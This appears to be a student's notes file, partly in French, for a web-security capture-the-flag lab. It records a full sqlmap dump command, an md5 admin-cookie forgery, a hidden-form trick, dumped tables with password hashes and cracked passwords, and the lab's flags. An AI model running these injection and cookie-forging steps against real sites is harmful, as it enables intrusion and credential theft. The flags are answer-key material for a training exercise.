@@ -1,0 +1,92 @@
+#+TITLE: Temp
+
+* Login page :
+
+Recover password - webmaster@borntosec.com
+~flag - 1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0~
+
+La balise est cachee, si on supprime le contenu du form et qu'on submit, le flag nous est donne
+
+* Cookies :
+Cookies - I_am_admin 68934a3e9455fa72420237eb05902327
+hashid 68934a3e9455fa72420237eb05902327
+Le hash est en md5 est veut dire false
+
+echo true | md5
+74d9a83219cabaab06a69fd318873f335
+
+Remplacons le cookie
+
+* Search image :
+
+vulnerable a l'injection sql
+sqlmap --batch --dump -u <curl requete> --level=5 --risk=3 --technique=BEU
+echo 1928e8083cf461a51303633093573c46 | sha2
+~flag - 0dc499fbaa964a62c8b9ee5918e08a3387595e3d0c0cf0650e289e3a3e9a427a~
+
+* Search users :
+injection sql comme image
+
+echo 5ff9d0165b4f92b14994e5c685cdce28 | sha2
+~flag - be7803fb10d8ae560da023739a9847c370fca422f990bbb519cea9e85c45c32b~
+
+* Source page :
+?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c
+
+* Login :
+~admin - shadow = b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2~
+root - shadow =
+b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
+
+
+
+
+Database: Member_Brute_Force
+Table: db_default
+[2 entries]
++----+-------------------------------------------+----------+
+| id | password                                  | username |
++----+-------------------------------------------+----------+
+| 1  | 3bf1114a986ba87ed28fc1b5884fc2f8 (shadow) | root     |
+| 2  | 3bf1114a986ba87ed28fc1b5884fc2f8 (shadow) | admin    |
++----+-------------------------------------------+----------+
+
+Database: Member_Sql_Injection
+Table: users
+[4 entries]
++---------+-----------+--------+-----------+-----------+----------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------+------------------------------------------------+
+| user_id | town      | planet | country   | last_name | first_name     | Commentaire                                                                                                                                                          | countersign                                    |
++---------+-----------+--------+-----------+-----------+----------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------+------------------------------------------------+
+| 1       | Honolulu  | EARTH  | America   | Obama     | Barack Hussein | Amerca !                                                                                                                                                             | 2b3366bcfd44f540e630d4dc2b9b06d9               |
+| 2       | Berlin    | Earth  | Allemagne | Hitler    | Adolf          | Ich spreche kein Deutsch.                                                                                                                                            | 60e9032c586fb422e2c16dee6286cf10 (oktoberfest) |
+| 3       | Moscou    | Earth  | Russia    | Staline   | Joseph         | \\0418\\043E\\0441\\0438\\0444 \\0412\\0438\\0441\\0441\\0430\\0440\\0438\\043E\\043D\\043E\\0432\\0438\\0447 \\0414\\0436\\0443\\0433\\0430\\0448\\0432\\0438\\043B | e083b24a01c483437bcf4a9eea7c1b4d               |
+| 5       | 42        | 42     | 42        | GetThe    | Flag           | Decrypt this password -> then lower all the char. Sh256 on it and it's good !                                                                                        | 5ff9d0165b4f92b14994e5c685cdce28               |
++---------+-----------+--------+-----------+-----------+----------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------+------------------------------------------------+
+
+
+Database: Member_images
+Table: list_images
+[6 entries]
++----+----------------------------------+-----------+-----------------------------------------------------------------------------------------------------------------------+
+| id | url                              | title     | comment                                                                                                               |
++----+----------------------------------+-----------+-----------------------------------------------------------------------------------------------------------------------+
+| 1  | https://www.nsa.org/img.jpg      | Nsa       | An image about the NSA !                                                                                              |
+| 2  | https://www.42.fr/42.png         | 42 !      | There is a number..                                                                                                   |
+| 3  | https://www.google.fr/google.png | Google    | Google it !                                                                                                           |
+| 4  | https://www.obama.org/obama.jpg  | Obama     | Yes we can !                                                                                                          |
+| 5  | borntosec.ddns.net/images.png    | Hack me ? | If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46 |
+| 6  | https://www.h4x0r3.0rg/tr0ll.png | tr00l     | Because why not ?                                                                                                     |
++----+----------------------------------+-----------+-----------------------------------------------------------------------------------------------------------------------+
+
+
+Database: Member_survey
+Table: vote_dbs
+[4 columns]
++---------+--------------+
+| Column  | Type         |
++---------+--------------+
+| id_vote | int(11)      |
+| nb_vote | int(11)      |
+| subject | varchar(255) |
+| vote    | float        |
++---------+--------------+
